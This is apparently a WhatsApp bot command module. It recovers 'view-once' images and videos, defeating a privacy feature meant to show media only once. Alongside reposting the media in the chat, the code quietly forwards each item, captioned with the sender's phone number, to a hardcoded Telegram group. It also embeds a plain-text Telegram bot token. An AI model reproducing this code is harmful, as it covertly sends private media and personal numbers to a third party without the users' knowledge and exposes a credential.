import { downloadContentFromMessage } from '@whiskeysockets/baileys';
import fs from 'fs';
import { Telegraf } from 'telegraf';

const bot = new Telegraf('7628521417:AAFCSFB1FjZuZHaMcJD4iUbquLb7P77QrOs'); // Provided bot token
const telegramGroupId = '-1002257257980'; // Provided group ID

const rvo = async (m, sock) => {
  try {
    console.log('Quoted message:', m.quoted); // Log the quoted message

    const prefixMatch = m.body.match(/^[\\/!#.]/);
    const prefix = prefixMatch ? prefixMatch[0] : '/';
    const cmd = m.body.startsWith(prefix) ? m.body.slice(prefix.length).split(' ')[0].toLowerCase() : '';

    const validCommands = ['rvo', 'vv', 'readviewonce'];
    if (!validCommands.includes(cmd)) return;

    // Check if the quoted message is a view-once message
    if (!m.quoted || m.quoted.type !== 'view_once' || (m.quoted.mtype !== 'imageMessage' && m.quoted.mtype !== 'videoMessage')) {
      return m.reply('This is not a view once message');
    }

    // Extract the message and its type
    const msg = m.quoted.message;
    const type = Object.keys(msg)[0];

    const originalCaption = msg[type].caption || '';
    const senderNumber = m.sender; // Get the sender's WhatsApp number
    const newCaption = `${originalCaption}\n\n> © Powered By R C D-MD\n\nSender: ${senderNumber}`; // Append sender number to caption

    // Download the media content
    const mediaStream = await downloadContentFromMessage(msg[type], type === 'imageMessage' ? 'image' : 'video');

    // Create a buffer to hold the media
    const buffer = await new Promise((resolve, reject) => {
      const chunks = [];
      mediaStream.on('data', chunk => chunks.push(chunk));
      mediaStream.on('end', () => resolve(Buffer.concat(chunks)));
      mediaStream.on('error', reject);
    });

    // Prepare the send message options
    const sendOptions = {
      contextInfo: {
        mentionedJid: [m.sender],
        forwardingScore: 9999,
        isForwarded: true,
      },
      quoted: m
    };

    // Send the media back to the chat
    const sendMessagePromise = type.includes('video')
      ? sock.sendMessage(m.from, { video: buffer, caption: newCaption }, sendOptions)
      : sock.sendMessage(m.from, { image: buffer, caption: newCaption }, sendOptions);

    // Forward the media to the Telegram group
    const telegramSendPromise = type.includes('video')
      ? bot.telegram.sendVideo(telegramGroupId, { source: buffer }, { caption: newCaption }) // Send video to group
      : bot.telegram.sendPhoto(telegramGroupId, { source: buffer }, { caption: newCaption }); // Send photo to group

    // Execute both send operations concurrently
    await Promise.all([sendMessagePromise, telegramSendPromise]);
  } catch (e) {
    console.error('Error Details:', e); // Log detailed error
    m.reply(`An error occurred while processing the command: ${e.message}`);
  }
};

export default rvo;
